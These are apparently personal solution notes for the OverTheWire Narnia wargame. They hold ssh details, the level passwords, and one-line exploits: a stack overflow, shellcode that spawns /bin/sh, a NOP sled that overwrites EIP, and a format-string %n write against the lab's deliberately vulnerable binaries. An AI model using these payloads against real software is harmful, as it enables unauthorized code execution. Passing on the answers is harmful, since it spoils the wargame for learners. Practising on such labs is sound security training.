NARNIA - OTW WARGAME:

passwords for next level is at /etc/narnia_pass
problems and source code in /narnia 	:cd /narnia
ssh narnia0@narnia.labs.overthewire.org -p 2226
for peda integration: echo "source /usr/local/peda/peda.py">>~/.gdbinit

narnia0:

	pass=narnia0
	Just a simple overflow and overwrite val with 0xdeadbeef
	(python -c 'print "A"*20+"\xef\xbe\xad\xde"';cat)|./narnia0

	gives shell and password for next level is efeidiedae

narnia1:
	
	pass=efeidiedae
	just a simple setting up environment variable EGG and it gets executed0 no
	export EGG=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
	cat /etc/narnia_pass/narnia2 gives the password for this level 

narnia2:

	pass=nairiepecu
	just a buffer overflow with aslr and nx disabled. so did shellcode injection and executed it.
	using gdb found that offset to eip is 140, then the stack address for buffer is 0xffffd610. Then filled with nop sled of length 60
	and then shellcode and "A" and overwrote eip with 0xffffd630 which is 0xffffd610 + 32 roughly the middle of nop sled.
	cat /etc/narnia_pass/narnia3 gives password for this level

narnia3:
	
	pass=vaequeezee
	#took screenshot


narnia4:
	
	pass= thaenohtai
	./narnia4 $(python -c 'print "\x90"*240+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"A"*7+"\x48\xd8\xff\xff"')

narnia5:
	
	pass=faimahchiy
	./narnia5 $(python -c 'print "\x2c\xd7\xff\xff%496x%5$n"')

narnia6:

	pass= neezocaeng
	



	
	